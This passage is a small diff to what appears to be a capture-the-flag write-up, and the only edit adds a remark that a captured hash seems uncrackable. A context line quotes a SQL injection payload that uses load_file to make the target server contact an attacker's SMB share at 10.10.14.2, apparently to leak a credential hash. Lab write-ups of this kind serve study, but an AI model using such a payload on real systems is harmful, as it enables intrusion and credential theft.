@@ -154,5 +154,5 @@ Querying `term=1'union select load_file('\\\\10.10.14.2\\test'),2,3;-- -`
 
 ```
 
-I don't know why this worked and Osanda's did not. I will have to continue reading about it.
+I don't know why this worked and Osanda's did not. I will have to continue reading about it. Also, this hash does not seem crackable.
 
